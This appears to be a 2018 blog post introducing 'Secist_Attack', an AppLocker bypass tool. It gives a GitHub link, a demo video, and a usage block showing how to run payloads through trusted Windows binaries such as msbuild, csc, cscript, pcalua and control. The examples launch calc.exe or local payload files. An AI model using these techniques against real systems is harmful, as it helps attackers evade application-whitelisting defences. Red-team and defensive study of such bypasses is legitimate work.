---
title: secist_Apploacker_bypass
date: 2018-01-31 22:30:22
tags: Windows
categories: Windows
---
![enter description here][1]
<!--more-->
## 视频演示：
<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/secist_attack.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>

Github :https://github.com/demonsec666/Secist_Applocker


```
-c, --csc:            <path>    Example:  Secist_Attack.exe -c |or  --csc C:\Users\demon\secist.cs |and run secist.exe
-C, --cscript:        <path>    Example:  Secist_Attack.exe -C |or  --cscript  C:\Users\demon\Payload\secist.txt
-m, --msbuild:        <path>    Example:  Secist_Attack.exe -m |or  --msbuild  C:\Users\demon\Payload\secist.csproj
-i, --cl_invocation:  <Command> Example:  Secist_Attack.exe -i |or  --cl_invocation  calc.exe
                                                                  Secist_Attack.exe -i "powershell.exe  calc"
-p, --pcalua:         <APP>     Example:  Secist_Attack.exe -p |or  --pcalua  calc.exe
-l, --control:        <DLL>     Example:  Secist_Attack.exe -l |or  --control C:\Users\demon\example\runcalc.dll
-A, --Applocker:      <shell>   Example:  Secist_Attack.exe -A |or  --Applocker
-h, --help:           <help>    Example:  Secist_Attack.exe -h |or  --help     <show help>
```	

![enter description here][2]
&nbsp;
![enter description here][3]
&nbsp;
![enter description here][4]
&nbsp;

![enter description here][5]


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/IMG_20180131_223511.jpg
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1517410172598.jpg
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1517410332606.jpg 
  [4]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1517410192976.jpg
  [5]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1517410258909.jpg 